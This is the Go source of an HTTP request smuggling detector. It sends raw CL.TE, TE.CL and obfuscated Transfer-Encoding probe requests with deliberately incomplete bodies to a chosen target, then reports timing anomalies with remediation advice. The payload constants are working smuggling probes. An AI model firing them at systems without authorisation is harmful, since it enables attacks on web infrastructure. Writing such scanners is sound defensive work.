// glitchdesync/main.go
// GLITCHICONS — HTTP Request Smuggling Detector
//
// Detects HTTP request smuggling vulnerabilities using timing-based
// and differential analysis. Uses raw net.Conn for precise byte control
// — Python httpx/requests cannot do this (normalizes headers).
//
// Smuggling Types Detected:
//   CL.TE  — Frontend: Content-Length, Backend: Transfer-Encoding
//   TE.CL  — Frontend: Transfer-Encoding, Backend: Content-Length
//   TE.TE  — Both support TE but obfuscation confuses one endpoint
//             Variants: tab-prefix, space, capitalization, x-chunked, identity
//   H2.CL  — HTTP/2 → HTTP/1.1 downgrade with CL mismatch
//
// Detection Method:
//   Timing: Smuggled bytes cause backend to WAIT for more data → timeout
//   If normal req: 200ms, smuggled req: >5000ms → VULNERABLE
//
// Usage:
//   glitchdesync --target https://target.com
//   glitchdesync --target https://api.corp.com/login --method POST
//   glitchdesync --target https://target.com --mode cl-te
//   glitchdesync --target https://target.com --mode all --output desync.json

package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net"
	"net/url"
	"os"
	"strings"
	"time"
)

const Version = "4.4.0"

// ── Smuggling payloads ────────────────────────────────────

// CL.TE timing attack:
// Frontend uses Content-Length → passes body to backend
// Backend uses Transfer-Encoding → waits for next chunk → TIMEOUT
const cltePayload = "POST %s HTTP/1.1\r\n" +
	"Host: %s\r\n" +
	"Content-Type: application/x-www-form-urlencoded\r\n" +
	"Content-Length: 4\r\n" +
	"Transfer-Encoding: chunked\r\n" +
	"Connection: close\r\n" +
	"\r\n" +
	"1\r\n" +
	"Z\r\n" +
	"Q\r\n" // Deliberately incomplete — backend waits for "0\r\n\r\n"

// TE.CL timing attack:
// Frontend uses Transfer-Encoding → processes "0\r\n\r\n" as end
// Backend uses Content-Length: 6 → waits for 6 bytes, got 5 → TIMEOUT
const teclPayload = "POST %s HTTP/1.1\r\n" +
	"Host: %s\r\n" +
	"Content-Type: application/x-www-form-urlencoded\r\n" +
	"Content-Length: 6\r\n" +
	"Transfer-Encoding: chunked\r\n" +
	"Connection: close\r\n" +
	"\r\n" +
	"0\r\n" +
	"\r\n" +
	"X" // Backend waiting for 1 more byte → TIMEOUT

// TE.TE obfuscation variants — one endpoint ignores malformed TE header
var teteVariants = []struct {
	Name    string
	TEValue string
}{
	{"tab-prefix", "Transfer-Encoding:\tchunked"},
	{"space-before", "Transfer-Encoding : chunked"},
	{"x-chunked", "Transfer-Encoding: x-chunked"},
	{"chunked-space", "Transfer-Encoding: chunked "},
	{"identity-chunked", "Transfer-Encoding: identity\r\nTransfer-Encoding: chunked"},
	{"chunk-ext", "Transfer-Encoding: chunked;ext=value"},
}

// H2.CL attack hint payload (detected via h2c upgrade attempt)
const h2clUpgrade = "GET / HTTP/1.1\r\n" +
	"Host: %s\r\n" +
	"Connection: Upgrade, HTTP2-Settings\r\n" +
	"Upgrade: h2c\r\n" +
	"HTTP2-Settings: AAMAAABkAAQAAP__\r\n" +
	"\r\n"

// ── Data types ────────────────────────────────────────────

type Finding struct {
	Title       string  `json:"title"`
	Severity    string  `json:"severity"`
	CVSS        float64 `json:"cvss"`
	CWE         string  `json:"cwe"`
	Target      string  `json:"target"`
	Description string  `json:"description"`
	Evidence    string  `json:"evidence"`
	Remediation string  `json:"remediation"`
	Source      string  `json:"source"`
}

type SmuggleResult struct {
	Variant      string        `json:"variant"`
	Vulnerable   bool          `json:"vulnerable"`
	NormalTimeMS int64         `json:"normal_time_ms"`
	AttackTimeMS int64         `json:"attack_time_ms"`
	Ratio        float64       `json:"time_ratio"`
	StatusCode   int           `json:"status_code,omitempty"`
	Evidence     string        `json:"evidence,omitempty"`
}

type ScanResult struct {
	Target        string          `json:"target"`
	Host          string          `json:"host"`
	Path          string          `json:"path"`
	TLS           bool            `json:"tls"`
	Timestamp     string          `json:"timestamp"`
	Results       []SmuggleResult `json:"smuggling_results"`
	H2CSupported  bool            `json:"h2c_upgrade_supported"`
	Findings      []Finding       `json:"findings"`
	Version       string          `json:"scanner_version"`
}

// ── Connection helpers ────────────────────────────────────

func dialTarget(host string, port string, useTLS bool, timeout time.Duration) (net.Conn, error) {
	addr := net.JoinHostPort(host, port)
	if useTLS {
		return tls.DialWithDialer(
			&net.Dialer{Timeout: timeout},
			"tcp", addr,
			&tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host,
			},
		)
	}
	return net.DialTimeout("tcp", addr, timeout)
}

// sendRaw sends raw bytes and reads response with deadline
func sendRaw(conn net.Conn, data []byte, timeout time.Duration) ([]byte, int64, error) {
	start := time.Now()
	conn.SetDeadline(time.Now().Add(timeout))

	_, err := conn.Write(data)
	if err != nil {
		return nil, 0, err
	}

	reader := bufio.NewReader(conn)
	buf    := make([]byte, 4096)
	n, err  := reader.Read(buf)
	elapsed := time.Since(start).Milliseconds()

	if err != nil && err != io.EOF {
		// Timeout = backend was waiting (potential vuln indicator)
		return nil, elapsed, err
	}
	return buf[:n], elapsed, nil
}

func parseStatusCode(resp []byte) int {
	if len(resp) < 12 {
		return 0
	}
	s := string(resp[:12])
	if strings.HasPrefix(s, "HTTP/1") {
		code := 0
		fmt.Sscanf(s[9:12], "%d", &code)
		return code
	}
	return 0
}

// ── Baseline measurement ──────────────────────────────────

func measureBaseline(host, port, path string, useTLS bool, timeout time.Duration) (int64, int) {
	conn, err := dialTarget(host, port, useTLS, timeout)
	if err != nil {
		return 0, 0
	}
	defer conn.Close()

	req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", path, host)
	resp, elapsed, _ := sendRaw(conn, []byte(req), timeout)
	return elapsed, parseStatusCode(resp)
}

// ── CL.TE detection ───────────────────────────────────────

func detectCLTE(host, port, path string, useTLS bool, baselineMS int64, timeout time.Duration, verbose bool) SmuggleResult {
	result := SmuggleResult{Variant: "CL.TE", NormalTimeMS: baselineMS}

	conn, err := dialTarget(host, port, useTLS, timeout)
	if err != nil {
		result.Evidence = "connection failed: " + err.Error()
		return result
	}
	defer conn.Close()

	payload := fmt.Sprintf(cltePayload, path, host)
	_, elapsed, _ := sendRaw(conn, []byte(payload), timeout)
	result.AttackTimeMS = elapsed

	if baselineMS > 0 {
		result.Ratio = float64(elapsed) / float64(baselineMS)
	}

	// Vulnerability indicator: attack takes 3x+ longer than baseline
	// AND attack time >= 4 seconds (backend waiting)
	if elapsed >= 4000 && (baselineMS == 0 || result.Ratio >= 3.0) {
		result.Vulnerable = true
		result.Evidence   = fmt.Sprintf(
			"Timing anomaly: baseline=%dms attack=%dms ratio=%.1fx\n"+
				"Backend appears to wait for additional Transfer-Encoding chunk",
			baselineMS, elapsed, result.Ratio,
		)
		if verbose {
			fmt.Printf("[!] CL.TE POTENTIAL: %s — attack=%dms (ratio=%.1fx baseline)\n",
				host, elapsed, result.Ratio)
		}
	} else if verbose {
		fmt.Printf("[*] CL.TE safe: %s — attack=%dms (baseline=%dms)\n", host, elapsed, baselineMS)
	}
	return result
}

// ── TE.CL detection ───────────────────────────────────────

func detectTECL(host, port, path string, useTLS bool, baselineMS int64, timeout time.Duration, verbose bool) SmuggleResult {
	result := SmuggleResult{Variant: "TE.CL", NormalTimeMS: baselineMS}

	conn, err := dialTarget(host, port, useTLS, timeout)
	if err != nil {
		result.Evidence = "connection failed"
		return result
	}
	defer conn.Close()

	payload := fmt.Sprintf(teclPayload, path, host)
	_, elapsed, _ := sendRaw(conn, []byte(payload), timeout)
	result.AttackTimeMS = elapsed

	if baselineMS > 0 {
		result.Ratio = float64(elapsed) / float64(baselineMS)
	}

	if elapsed >= 4000 && (baselineMS == 0 || result.Ratio >= 3.0) {
		result.Vulnerable = true
		result.Evidence   = fmt.Sprintf(
			"Timing anomaly: baseline=%dms attack=%dms ratio=%.1fx\n"+
				"Backend appears to wait for Content-Length body bytes",
			baselineMS, elapsed, result.Ratio,
		)
		if verbose {
			fmt.Printf("[!] TE.CL POTENTIAL: %s — attack=%dms (ratio=%.1fx)\n",
				host, elapsed, result.Ratio)
		}
	} else if verbose {
		fmt.Printf("[*] TE.CL safe: %s — attack=%dms\n", host, elapsed)
	}
	return result
}

// ── TE.TE detection ───────────────────────────────────────

func detectTETE(host, port, path string, useTLS bool, baselineMS int64, timeout time.Duration, verbose bool) []SmuggleResult {
	var results []SmuggleResult

	for _, variant := range teteVariants {
		conn, err := dialTarget(host, port, useTLS, timeout)
		if err != nil {
			continue
		}

		// Obfuscated TE header + CL.TE-style attack body
		payload := fmt.Sprintf(
			"POST %s HTTP/1.1\r\n"+
				"Host: %s\r\n"+
				"Content-Type: application/x-www-form-urlencoded\r\n"+
				"Content-Length: 4\r\n"+
				"%s\r\n"+
				"Connection: close\r\n"+
				"\r\n"+
				"1\r\n"+
				"Z\r\n"+
				"Q\r\n",
			path, host, variant.TEValue,
		)

		_, elapsed, _ := sendRaw(conn, []byte(payload), timeout)
		conn.Close()

		r := SmuggleResult{
			Variant:      "TE.TE/" + variant.Name,
			NormalTimeMS: baselineMS,
			AttackTimeMS: elapsed,
		}
		if baselineMS > 0 {
			r.Ratio = float64(elapsed) / float64(baselineMS)
		}
		if elapsed >= 4000 && (baselineMS == 0 || r.Ratio >= 3.0) {
			r.Vulnerable = true
			r.Evidence   = fmt.Sprintf("Obfuscated TE header '%s' — timing anomaly: %dms",
				variant.TEValue, elapsed)
			if verbose {
				fmt.Printf("[!] TE.TE/%s POTENTIAL: %dms\n", variant.Name, elapsed)
			}
		}
		results = append(results, r)
	}
	return results
}

// ── h2c upgrade detection ─────────────────────────────────

func detectH2C(host, port, path string, useTLS bool, timeout time.Duration) bool {
	// h2c only works on cleartext HTTP (not TLS which uses ALPN instead)
	if useTLS {
		return false
	}
	conn, err := dialTarget(host, port, false, timeout)
	if err != nil {
		return false
	}
	defer conn.Close()

	payload := fmt.Sprintf(h2clUpgrade, host)
	resp, _, _ := sendRaw(conn, []byte(payload), timeout)
	if len(resp) == 0 {
		return false
	}

	body := string(resp)
	// 101 Switching Protocols indicates h2c upgrade accepted
	return strings.Contains(body, "101") &&
		(strings.Contains(body, "h2c") || strings.Contains(body, "upgrade"))
}

// ── Main scanner ──────────────────────────────────────────

func scanDesync(target, mode string, timeout time.Duration, verbose bool) ScanResult {
	result := ScanResult{
		Target:    target,
		Timestamp: time.Now().UTC().Format(time.RFC3339),
		Findings:  []Finding{},
		Version:   Version,
	}

	// Parse target URL
	u, err := url.Parse(target)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Invalid URL: %v\n", err)
		return result
	}

	host := u.Hostname()
	port := u.Port()
	path := u.Path
	if path == "" {
		path = "/"
	}
	useTLS := u.Scheme == "https"
	if port == "" {
		if useTLS {
			port = "443"
		} else {
			port = "80"
		}
	}

	result.Host   = host
	result.Path   = path
	result.TLS    = useTLS

	fmt.Printf("[*] glitchdesync v%s | %s | mode=%s | TLS=%v\n",
		Version, target, mode, useTLS)

	// Baseline
	fmt.Println("[*] Measuring baseline response time...")
	baselineMS, _ := measureBaseline(host, port, path, useTLS, timeout)
	fmt.Printf("[*] Baseline: %dms\n", baselineMS)

	runCLTE := mode == "all" || mode == "cl-te"
	runTECL := mode == "all" || mode == "te-cl"
	runTETE := mode == "all" || mode == "te-te"
	runH2C  := mode == "all" || mode == "h2c"

	if runCLTE {
		fmt.Println("[*] Testing CL.TE smuggling...")
		r := detectCLTE(host, port, path, useTLS, baselineMS, timeout, verbose)
		result.Results = append(result.Results, r)
		if r.Vulnerable {
			result.Findings = append(result.Findings, buildFinding("CL.TE", target, r.Evidence, r.AttackTimeMS, baselineMS))
		}
	}

	if runTECL {
		fmt.Println("[*] Testing TE.CL smuggling...")
		r := detectTECL(host, port, path, useTLS, baselineMS, timeout, verbose)
		result.Results = append(result.Results, r)
		if r.Vulnerable {
			result.Findings = append(result.Findings, buildFinding("TE.CL", target, r.Evidence, r.AttackTimeMS, baselineMS))
		}
	}

	if runTETE {
		fmt.Println("[*] Testing TE.TE obfuscation variants...")
		teteResults := detectTETE(host, port, path, useTLS, baselineMS, timeout, verbose)
		for _, r := range teteResults {
			result.Results = append(result.Results, r)
			if r.Vulnerable {
				result.Findings = append(result.Findings, buildFinding(r.Variant, target, r.Evidence, r.AttackTimeMS, baselineMS))
			}
		}
	}

	if runH2C {
		fmt.Println("[*] Testing h2c cleartext upgrade...")
		result.H2CSupported = detectH2C(host, port, path, useTLS, timeout)
		if result.H2CSupported {
			result.Findings = append(result.Findings, Finding{
				Title:       "HTTP/2 Cleartext (h2c) Upgrade Accepted",
				Severity:    "MEDIUM",
				CVSS:        6.5,
				CWE:         "CWE-444",
				Target:      target,
				Description: "Server accepts HTTP/2 cleartext upgrade (h2c). This can enable HTTP/2 downgrade smuggling where an attacker exploits differences between HTTP/2 framing and HTTP/1.1 parsing.",
				Evidence:    "HTTP/1.1 Upgrade: h2c → 101 Switching Protocols received",
				Remediation: "Disable h2c if not required. Use HTTPS with ALPN for HTTP/2 negotiation instead of cleartext upgrade.",
				Source:      "module:glitchdesync",
			})
		}
	}

	// Summary
	vulnCount := 0
	for _, r := range result.Results {
		if r.Vulnerable {
			vulnCount++
		}
	}
	fmt.Printf("[*] Done: %d variants tested | %d potentially vulnerable\n",
		len(result.Results), vulnCount)

	return result
}

func buildFinding(variant, target, evidence string, attackMS, baselineMS int64) Finding {
	return Finding{
		Title:    fmt.Sprintf("HTTP Request Smuggling Detected: %s", variant),
		Severity: "CRITICAL",
		CVSS:     9.8,
		CWE:      "CWE-444",
		Target:   target,
		Description: fmt.Sprintf(
			"%s desynchronization detected. Frontend and backend HTTP servers disagree on where "+
				"the request body ends. Attacker can poison the request queue, bypass access controls, "+
				"steal other users' requests, or achieve reflected XSS/redirect.",
			variant,
		),
		Evidence: fmt.Sprintf(
			"Variant: %s\nBaseline: %dms | Attack: %dms\n%s",
			variant, baselineMS, attackMS, evidence,
		),
		Remediation: "Ensure consistent use of Transfer-Encoding OR Content-Length (not both). " +
			"Configure proxy to normalize or reject ambiguous requests. " +
			"Use HTTP/2 end-to-end to eliminate HTTP/1.1 smuggling surface. " +
			"Reject requests with both CL and TE headers.",
		Source: "module:glitchdesync",
	}
}

// ── Main ──────────────────────────────────────────────────

func main() {
	target  := flag.String("target",  "", "Target URL (https://target.com)")
	mode    := flag.String("mode",    "all", "Attack mode: all|cl-te|te-cl|te-te|h2c")
	timeout := flag.Int("timeout",    8,   "Per-request timeout seconds (use 6+ for timing attacks)")
	output  := flag.String("output",  "", "Output JSON file")
	verbose := flag.Bool("verbose",   false, "Verbose output")
	ver     := flag.Bool("version",   false, "Print version")
	flag.Parse()

	if *ver {
		fmt.Printf("glitchdesync v%s\n", Version)
		os.Exit(0)
	}
	if *target == "" {
		fmt.Fprintln(os.Stderr, "Usage: glitchdesync --target https://target.com [--mode all|cl-te|te-cl|te-te|h2c]")
		fmt.Fprintln(os.Stderr, "Note: Use --timeout 8+ for accurate timing detection")
		os.Exit(1)
	}

	validModes := map[string]bool{"all": true, "cl-te": true, "te-cl": true, "te-te": true, "h2c": true}
	if !validModes[*mode] {
		fmt.Fprintf(os.Stderr, "Invalid mode: %s (use: all|cl-te|te-cl|te-te|h2c)\n", *mode)
		os.Exit(1)
	}

	result := scanDesync(*target, *mode, time.Duration(*timeout)*time.Second, *verbose)

	data, _ := json.MarshalIndent(result, "", "  ")
	if *output != "" {
		os.WriteFile(*output, data, 0644)
		fmt.Printf("[+] Results saved to %s\n", *output)
	} else {
		fmt.Println(string(data))
	}
}
